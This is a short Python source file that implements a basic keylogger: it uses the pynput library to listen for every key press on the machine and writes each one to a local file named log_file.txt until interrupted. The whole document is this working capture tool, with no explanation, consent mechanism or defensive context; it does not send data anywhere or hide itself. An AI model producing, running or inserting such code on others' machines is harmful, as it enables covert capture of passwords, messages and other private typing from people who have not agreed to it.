#!/usr/bin/env python3

from pynput.keyboard import Listener
import logging


def keyboard_event(key):
    log_file = 'log_file.txt'

    logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(message)s')
    logging.info(key)

def main():
    with Listener(on_press=keyboard_event) as listener:
        listener.join()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n')
        logging.shutdown() 
